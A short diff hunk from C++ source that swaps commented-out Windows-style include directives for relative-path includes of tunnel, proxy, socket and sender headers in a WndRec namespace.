@@ -1,8 +1,18 @@
-#include "WndRec\portforward.h"
-#include "WndRec\sender.h"
-#include "core\core.h"
-#include "core\debug.h"
-#include "core\http.h"
+//#include "WndRec\portforward.h"
+//#include "WndRec\sender.h"
+//#include "core\core.h"
+//#include "core\debug.h"
+//#include "core\http.h"
+
+#include "../../core/include/core/type.h"
+#include "../../core/include/core/string.h"
+#include "../../bot/source/abstract.cpp"
+#include "../include/WndRec/tunnel.h"
+#include "../include/WndRec/stream.h"
+#include "../../core/include/core/debug.h"
+#include "../../core/include/core/proxy.h"
+#include "../../core/include/core/socket.h"
+#include "../include/WndRec/sender.h"
 
 namespace WndRec
 {
